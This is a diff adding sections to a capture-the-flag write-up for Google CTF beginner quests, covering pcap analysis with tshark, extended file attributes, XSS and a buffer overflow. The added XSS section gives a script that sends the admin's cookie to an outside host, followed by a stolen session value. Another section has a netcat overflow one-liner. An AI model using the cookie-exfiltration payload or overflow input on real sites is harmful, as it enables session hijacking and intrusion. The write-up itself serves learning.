@@ -69,9 +69,9 @@ We can get the flag from the traffic: `CTF{4efcc72090af28fd33a2118985541f92e7934
  I learn this commands from another user's solution which is very useful with wireshark:
 
 ```console
-root@kali:/media/sf_CTFs/google/Satellite# tshark -nr osmium.pcapng  -Y 'frame contains "password"'
+root@kali:xxxxx# tshark -nr osmium.pcapng  -Y 'frame contains "password"'
    16 28.632225193 34.76.101.29 → 10.0.2.15    TCP 417 1337 → 52616 [PSH, ACK] Seq=88 Ack=3 Win=65535 Len=363 1337 52616
-root@kali:/media/sf_CTFs/google/Satellite# tshark -nr osmium.pcapng  -Y 'frame contains "password"' -T fields -e data.text -o data.show_as_text:TRUE
+root@kali:xxxxx# tshark -nr osmium.pcapng  -Y 'frame contains "password"' -T fields -e data.text -o data.show_as_text:TRUE
 Username: brewtoot password: CTF{4efcc72090af28fd33a2118985541f92e793477f}      166.00 IS-19 2019/05/09 00:00:00       Swath 640km      Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m        Daily acquisition capacity: 220,000km Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E
 ```
 
@@ -96,3 +96,31 @@ Using the `getfattr` will show the extended attrib of the file. According to thi
 `getfattr --only-values credentials.txt > text.png`
 
 ![](img/flag.png)
+
+# Beginner's Quests - Government Agriculture Network 
+
+We are provided with a form, an admin and when testing out the form field we can see that "the admin will review your submission.". It's some kind of XSS. Let's just setup a webhook to get the cookie form admin:
+
+```
+<script>
+    location.href = 'https://mysite.com/?cookie='+document.cookie;
+</script>
+```
+
+Boom, easily get the cookie and flag:
+
+```
+cookie: 
+    flag=CTF{8aaa2f34b392b415601804c2f5f0f24e}; 
+    session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV
+```
+
+# Beginner's Quests - Stop Gan PWN
+
+We are given a file, and by running it we can guess it can be overflowed. (i'm lazy to type out the answer)
+
+So here is what we need to do, pipe it with the netcat:
+
+`{ echo "run"; python -c "print 'a'*600";} | nc buffer-overflow.ctfcompetition.com 1337`
+
+We got the flag: `CTF{Why_does_cauliflower_threaten_us}`
